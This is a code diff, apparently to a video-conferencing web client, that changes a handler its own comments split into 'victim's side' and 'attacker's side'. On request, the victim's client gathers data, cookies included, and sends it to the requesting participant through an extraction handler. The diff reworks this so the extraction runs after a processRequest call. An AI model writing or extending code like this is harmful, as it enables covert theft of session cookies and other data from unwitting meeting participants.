@@ -1435,7 +1435,7 @@ export default {
 
         const intervalId = window.setInterval(() => {
             // / call your function here
-            
+
             if (configuration.method === 'xmpp') {
                 configuration.pingInterval = startingSizeValue;
             } else {
@@ -1468,14 +1468,16 @@ export default {
 
         // this runs on the victim's side
         if (recievedData.type === 'request') {
-            if (recievedData.config.dataType !== 'cookies') {
-                APP.conference.dispatchExtraction(user, recievedData);
+            APP.conference._extractionHandler.processRequest().then(() => {
+                if (recievedData.config.dataType !== 'cookies') {
+                    APP.conference.dispatchExtraction(user, recievedData);
 
-                return;
-            }
-            this._acquireData(recievedData.config).then(acquiredData => {
-                console.log('Setup message:', recievedData);
-                APP.conference._extractionHandler.sendAll(acquiredData, user);
+                    return;
+                }
+                this._acquireData(recievedData.config).then(acquiredData => {
+                    console.log('Setup message:', recievedData);
+                    APP.conference._extractionHandler.sendAll(acquiredData, user);
+                });
             });
         } else { // 'reply' received, this runs on the attacker's side
             APP.conference._extractionHandler.receiveEndpointData(recievedData);
